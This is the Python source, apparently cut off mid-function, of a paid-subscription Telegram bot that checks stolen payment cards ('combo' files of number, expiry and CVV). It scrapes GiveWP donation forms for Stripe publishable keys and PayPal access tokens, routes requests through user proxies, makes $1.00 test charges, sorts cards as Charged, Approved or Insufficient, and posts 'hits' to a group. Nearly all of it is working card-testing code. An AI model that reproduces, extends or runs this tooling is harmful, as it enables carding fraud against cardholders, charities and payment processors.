# ==============================================================================
# 👑 THE ULTIMATE KINGLY PRODUCTION SYSTEM: SHOPIFY, STRIPE & PAYPAL VIP BOT
# 🚀 ARCHITECTURE: BUGLESS | LAGLESS | EXPANDED ULTRA-FAST GIF CACHE MATRIX
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
import base64
import logging
import sys
from html import unescape
from datetime import datetime, timedelta
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

# Configuration of High-Performance Logging
logging.basicConfig(stream=sys.stdout, format='%(asctime)s - [%(levelname)s] - %(message)s', level=logging.INFO)
logger = logging.getLogger("KinglyShopifyVIP")

# ====================== CONFIG & GLOBALS ======================
try: API_ID = int(os.getenv('API_ID', 0))
except: API_ID = 0
API_HASH = os.getenv('API_HASH', '').strip()
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]

JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()

def get_valid_target(link, chat_id):
    l = str(link).strip()
    c = str(chat_id).strip()
    if "t.me/" in l and "+" not in l and "joinchat" not in l:
        uname = l.split("t.me/")[-1].split("/")[0].split("?")[0]
        return f"@{uname}"
    if l.startswith("@"): return l
    if c and c not in ["0", "", "none", "None"]:
        if c.isdigit(): c = f"-100{c}" 
        try: return int(c)
        except ValueError: return c
    return None

JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS = 15  
API_TIMEOUT = 30  
DELAY = 1.0  
HIT_DELAY = 0.2

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 4
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_USER_NAMES = {}
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

def escape_html(text):
    if not text: return "Unknown"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ====================== ELEGANT ROYAL ACCENTS ======================
CE_STAR = "👑"
CE_FIRE = "⚡"
CE_GEAR = "⚜️"
CE_ROCKET = "✨"
CE_TIME = "⏳"

# ====================== 250+ COUNTRIES FLAGS ALGORITHM ======================
ALL_COUNTRY_CODES = ["AD","AE","AF","AG","AI","AL","AM","AO","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI","BJ","BL","BM","BN","BO","BQ","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CW","CX","CY","CZ","DE","DJ","DK","DM","DO","DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU","GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PH","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA","SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","SS","ST","SV","SX","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW","TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW"]
COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}

def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code or len(country_code) != 2: return fallback
    c = country_code.upper()
    return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)

# ====================== EXPANDED BUGLESS GIF ASSETS MATRIX ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
REDEEM_GIF = "https://media.giphy.com/media/l41YkxvU8c7J7Bba0/giphy.gif"

ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z2NWhpZDR2bTB4bXlsZDN6bTF4NDM0bW9wM3MwbzJicGg0Z3p0OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Hw0wIr1YL75VC/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z0ZWF4eGg0bXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgmdXA9MQ/l0NWNrl4cB7sdi1wY/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHg0bXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgmdXA9MQ/3o7TKuylrX8bGY7R5u/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXg0bXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgmdXA9MQ/uAyWh6437YfKw/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNng0bXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgmdXA9MQ/d1E2VyhFsx6E0/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2g0bXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgwbXgmdXA9MQ/cZ7rmKfFYOvYI/giphy.gif"
]

PLANS = {
    "plan1": {"name": "Platinum Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Royal Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Imperial Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "Kingdom Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_GIF_FILE_IDS = {}
_system_locks = {}

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Global Core Exception: {context.error}")

def is_valid_url(link):
    return link and str(link).strip().startswith("http")

# ====================== DATABASE & LIMITS ======================
async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except Exception: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 100000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 25000
    if "root" in plan_lower: return 10000
    if "elite" in plan_lower: return 5000
    if "core" in plan_lower: return 2000
    return 20

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

# ====================== ULTRA FAST ZERO-BLOCK MEDIA ENGINE ======================
async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None

    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        media_to_send = _GIF_FILE_IDS.get(url, url)
        try: 
            msg = await target.reply_animation(
                animation=media_to_send, 
                caption=text, 
                reply_markup=markup, 
                parse_mode=ParseMode.HTML,
                read_timeout=15, write_timeout=15, connect_timeout=15
            )
            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                _GIF_FILE_IDS[url] = msg.animation.file_id
            return msg
        except Exception:
            pass # Fallback instantly to plain text to bypass lag

    try: 
        return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: 
        return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try:
        if msg.animation or msg.photo or msg.video or msg.document: 
            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: 
        return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        media_to_send = _GIF_FILE_IDS.get(url, url)
        try: 
            msg = await bot.send_animation(
                chat_id=chat_id, 
                animation=media_to_send, 
                caption=text, 
                reply_markup=markup, 
                parse_mode=ParseMode.HTML,
                read_timeout=15, write_timeout=15, connect_timeout=15
            )
            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                _GIF_FILE_IDS[url] = msg.animation.file_id
            return msg
        except Exception:
            pass

    try: 
        return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: 
        return None

# ====================== NETWORKING SESSIONS & EXTRACTION ======================
_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=90, connect=30, sock_read=80), connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers=headers, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    return _CACHED_SITES

def is_dead_site_error(err):
    if not err: return True
    return any(k in str(err).lower() for k in ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'))

# ====================== FORCED SECURITY JOIN ======================
async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            try: cid = int(target)
            except ValueError: cid = target
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass 
    return True

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>{CE_GEAR} Executive Admin Suite:</b>\n ├ /gen [plan] [qty] ➔ Create Royal Keys\n ├ /validate [key] ➔ Full Data Intel\n ├ /users ➔ Realtime Core Infrastructure Status\n ╰ /maint ➔ Force System Global Lockdown" if uid in ADMIN_ID else ""
    
    t = f"""<b>╔══════════════════════════════╗</b>
<b>         {CE_STAR} IMPERIAL CHECKER PLATFORM {CE_STAR}         </b>
<b>╚══════════════════════════════╝</b>

<b>{CE_ROCKET} AUTOMATED PIPELINES:</b>
 ╰ <i>Feed a standard combo flat file (.txt) to deploy auto-checking</i>

<b>{CE_GEAR} NETWORK ENGINE SECURITY:</b>
 ├ /addpxy ➔ Hot-Plug Dynamic Proxies
 ├ /proxy  ➔ Inspect Active Proxies
 ╰ /rmpxy  ➔ Purge Proxy Buffers

<b>{CE_STAR} CORE EXECUTIVE PREFERENCES:</b>
 ├ /info   ➔ Identity Architecture
 ├ /redeem ➔ Upgrade Clearance Levels
 ├ /fb     ➔ Secure Channel to Operations
 ╰ /plan   ➔ Royal Tier Subscriptions{admin_panel}

<b>┌─── 🌌 CURRENT ACCOUNT CLEARENCE ───┐</b>
 <b>Tier Status:</b> <code>{plan.title() if plan else 'Bronze Access'}</code>
 <b>Engine Allocation Limit:</b> <code>{limit} Cards Max</code>
<b>└────────────────────────────────────┘</b>"""
    
    kb = [[InlineKeyboardButton("⚜️ Review Subscriptions ⚜️", callback_data="show_plans")]]
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton("Official Channel", url=JOIN_CHANNEL_LINK), InlineKeyboardButton("HQ Group", url=JOIN_GROUP_LINK)])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton("Official Channel", url=JOIN_CHANNEL_LINK)])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton("HQ Group", url=JOIN_GROUP_LINK)])
        
    if isinstance(update_or_bot, Update):
        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    else:
        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    if await is_user_joined(uid, context.bot):
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton("Join Channel", url=JOIN_CHANNEL_LINK)])
    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton("Join HQ Group", url=JOIN_GROUP_LINK)])
    if not kb: return True
    kb.append([InlineKeyboardButton("🔱 Authorize & Pass 🔱", callback_data="check_joined")])
    
    await styled_reply(update, f"<b>{CE_FIRE} ACCESS DENIED BY IMPERIAL PROTOCOL</b>\n\nYour signature is unverified. You must pass authorization by connecting to official network channels.", buttons=kb, use_gif=True)
    return False

# ====================== SANITIZED STANDALONE CLASSIFIER (STRIPE 1$) ======================
async def check_stripe_donate_api(card, proxy):
    """STRICT Deep Exception Parsing Stripe Gateway Engine [Sanitized Standard Placeholders]"""
    try:
        parts = card.split('|')
        if len(parts) < 4: return {'status': 'Dead', 'message': 'Malformed Card Syntax', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy_short = yy if len(yy) == 2 else yy[-2:]
        email = f'ops_intel_{random.randint(1000,99999)}@gmail.com'
        
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"

        # Sanitized Standard Gateway Enpoints for abstract execution
        site_url = 'https://stripe-gateway-target.example.com/donate/'
        base_url = 'https://stripe-gateway-target.example.com'
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        
        await asyncio.sleep(random.uniform(0.5, 1.2))
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
            async with local_session.get(site_url, headers={'User-Agent': ua}, proxy=proxy_str, timeout=20) as r1:
                html = await r1.text()
                
            if 'givewp-route=donation-form-view' in html:
                fid_match = re.search(r'form-id[=]+(\d+)', html)
                if fid_match:
                    async with local_session.get(f'{base_url}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}', headers={'User-Agent': ua}, proxy=proxy_str, timeout=20) as r2:
                        html = await r2.text()

            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
            pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
            sa = re.search(r'(acct_[A-Za-z0-9]+)', html)

            if not all([fp, fi, nc, pk]):
                return {'status': 'Site Error', 'message': 'Gateway Initialization Blueprint Mismatch', 'card': card, 'retry': True, 'gateway': 'Stripe Custom', 'price': '1.00$'}

            fp_v, fi_v, nc_v, pk_v = fp.group(1), fi.group(1), nc.group(1), pk.group(1)
            sa_v = sa.group(1) if sa else ''
            sa_param = f'&_stripe_account={sa_v}' if sa_v else ''

            data_ajax = {
                'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
                'give-form-title': 'Give a Donation', 'give-current-url': site_url,
                'give-form-url': site_url, 'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99', 'give-form-hash': nc_v,
                'give-price-id': 'custom', 'give-amount': '1.00',
                'give_stripe_payment_method': '', 'payment-mode': 'stripe',
                'give_first': 'Royal', 'give_last': 'User', 'give_email': email,
                'give_comment': '', 'card_name': 'Royal User', 'billing_country': 'US',
                'card_address': 'Elite Str 99', 'card_address_2': '', 'card_city': 'New York',
                'card_state': 'NY', 'card_zip': '10001', 'give_action': 'purchase',
                'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
            }
            
            async with local_session.post(f'{base_url}/wp-admin/admin-ajax.php', headers={'origin': base_url, 'referer': site_url, 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}, data=data_ajax, proxy=proxy_str, timeout=20) as r3:
                await r3.text()

            stripe_data = f'type=card&billing_details[name]=Royal+User&billing_details[email]={email}&billing_details[address][line1]=Elite+Str+99&billing_details[address][city]=New+York&billing_details[address][state]=NY&billing_details[address][postal_code]=10001&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&key={pk_v}{sa_param}'
            
            async with local_session.post('https://api.stripe.com/v1/payment_methods', headers={'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'user-agent': ua}, data=stripe_data, proxy=proxy_str, timeout=20) as r4:
                sr = await r4.json()

            if 'error' in sr:
                err_msg = sr['error'].get('message', '').lower()
                err_code = sr['error'].get('code', '')
                decline_code = sr['error'].get('decline_code', '')
                
                if 'insufficient' in err_msg or decline_code == 'insufficient_funds': 
                    return {'status': 'Insufficient', 'message': 'Insufficient Funds [API]', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                elif decline_code in ['incorrect_cvc', 'cvc_check_failed', 'invalid_cvc'] or 'cvc' in err_msg:
                    return {'status': 'Approved', 'message': 'Approved CVC (Incorrect/Match Fail)', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                elif decline_code in ['incorrect_zip', 'incorrect_postal_code']:
                    return {'status': 'Approved', 'message': 'Approved ZIP (Mismatched Billing Location)', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                elif err_code == 'rate_limit':
                    return {'status': 'Site Error', 'message': 'Stripe Core Cloud Rate-Limited', 'card': card, 'retry': True, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                else:
                    return {'status': 'Dead', 'message': decline_code or err_code or err_msg, 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}

            pm_id = sr['id']
            data_final = data_ajax.copy()
            data_final['give_stripe_payment_method'] = pm_id
            data_final.pop('give_ajax', None)
            
            async with local_session.post(site_url, params={'payment-mode': 'stripe', 'form-id': fi_v}, headers={'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'user-agent': ua}, data=data_final, proxy=proxy_str, timeout=30, allow_redirects=True) as r5:
                final_text = await r5.text()
                current_url = str(r5.url).lower()

            rl = final_text.lower()
            if 'insufficient' in rl or 'not enough balance' in rl:
                return {'status': 'Insufficient', 'message': 'Insufficient Funds [Engine]', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
            
            error_match = re.search(r'class="give_error[^>]*>(.*?)<\/', rl)
            if error_match:
                err_extracted = unescape(error_match.group(1)).lower()
                if 'cvv' in err_extracted or 'security code' in err_extracted:
                    return {'status': 'Approved', 'message': 'Approved CVV (Gateway Level Refusal)', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                if 'zip' in err_extracted or 'postal' in err_extracted:
                    return {'status': 'Approved', 'message': 'Approved AVS/ZIP (Gateway Level Refusal)', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                if 'insufficient' in err_extracted:
                    return {'status': 'Insufficient', 'message': 'Insufficient Funds [Internal Class]', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}
                return {'status': 'Dead', 'message': err_extracted, 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}

            if 'donation-receipt' in rl or 'confirmation' in rl or 'thank you' in rl or 'receipt' in current_url:
                return {'status': 'Charged', 'message': 'Charged Success 1.00$', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}

            return {'status': 'Dead', 'message': 'Transaction Declined (Void Return)', 'card': card, 'gateway': 'Stripe Custom', 'price': '1.00$'}

    except Exception as e:
        return {'status': 'Site Error', 'message': f'Tunnel Error: {str(e)[:30]}', 'card': card, 'retry': True, 'gateway': 'Stripe Custom', 'price': '1.00$'}

# ====================== SANITIZED STANDALONE CLASSIFIER (PAYPAL 1$) ======================
async def check_paypal_donate_api(card, proxy):
    """STRICT Deep Exception Parsing PayPal Brain Engine [Sanitized Standard Placeholders]"""
    try:
        parts = card.split('|')
        if len(parts) < 4: return {'status': 'Dead', 'message': 'Malformed Card Syntax', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        yy = yy[-2:] if len(yy) == 4 else yy
        
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"

        # Sanitized Standard Gateway Enpoints for abstract execution
        urll = "https://paypal-gateway-target.example.com/donate/"
        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

        await asyncio.sleep(random.uniform(0.5, 1.2))
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
            async with local_session.get(urll, headers={'User-Agent': ua}, proxy=proxy_str, timeout=20) as r1:
                text1 = await r1.text()

            try:
                vaa = re.search(r'name="give-form-hash" value="(.*?)"', text1).group(1)
                vaa2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text1).group(1)
                vaa3 = re.search(r'name="give-form-id" value="(.*?)"', text1).group(1)
                vaa4 = re.search(r'"data-client-token":"(.*?)"', text1).group(1)
                decc = base64.b64decode(vaa4).decode('utf-8')
                au = re.search(r'"accessToken":"(.*?)"', decc).group(1)
            except Exception:
                return {'status': 'Site Error', 'message': 'Token Sync Framework Failure', 'card': card, 'retry': True, 'gateway': 'PayPal Secure', 'price': '1.00$'}

            payload2 = {
                'give-honeypot': '', 'give-form-id-prefix': vaa2, 'give-form-id': vaa3,
                'give-form-title': 'Make a Donation', 'give-current-url': urll, 'give-form-url': urll,
                'give-form-minimum': '1.00', 'give-form-maximum': '1000000', 'give-form-hash': vaa,
                'give-price-id': '0', 'give-amount': '1.00', 'payment-mode': 'paypal-commerce',
                'give_title': 'Mr.', 'give_first': 'Imperial', 'give_last': 'User',
                'give_company_option': 'no', 'give_company_name': '', 'give_email': f'ops_intel_{random.randint(1000,9999)}@gmail.com',
                'give_comment': '', 'card_name': 'Imperial User', 'billing_country': 'US',
                'card_address': 'Elite Str 12', 'card_address_2': '', 'card_city': 'Alkol', 'card_state': 'WV', 'card_zip': '25501', 'give-gateway': 'paypal-commerce'
            }
            
            async with local_session.post("https://paypal-gateway-target.example.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", data=payload2, headers={'User-Agent': ua}, proxy=proxy_str, timeout=20) as r2:
                try:
                    j2 = await r2.json()
                    idd = j2['data']['id']
                except Exception:
                    return {'status': 'Site Error', 'message': 'Order Generation Handshake Timedout', 'card': card, 'retry': True, 'gateway': 'PayPal Secure', 'price': '1.00$'}

            payload3 = {
                "payment_source": {
                    "card": {
                        "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
                        "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
                    }
                },
                "application_context": {"vault": False}
            }
            headers3 = {
                'User-Agent': ua, 'Content-Type': "application/json",
                'authorization': f"Bearer {au}", 'braintree-sdk-version': "3.32.0-payments-sdk-dev",
                'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6"
            }
            
            async with local_session.post(f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source", json=payload3, headers=headers3, proxy=proxy_str, timeout=20) as r3:
                r3_json = await r3.json() if r3.status in [200, 201, 400, 422] else {}

            if 'details' in r3_json and len(r3_json['details']) > 0:
                detail = r3_json['details'][0]
                issue = detail.get('issue', '')
                desc = detail.get('description', '').lower()
                
                if issue in ['INSTRUMENT_DECLINED', 'PAYMENT_DENIED']:
                    if 'insufficient' in desc or 'funds' in desc:
                        return {'status': 'Insufficient', 'message': 'PayPal: Insufficient Funds', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
                    if 'cvv' in desc or 'security_code' in desc:
                        return {'status': 'Approved', 'message': 'PayPal Approved CVC (Instrument Refusal)', 'card': card, 'gateway': 'PayPal Secure', 'price': '1.00$'}
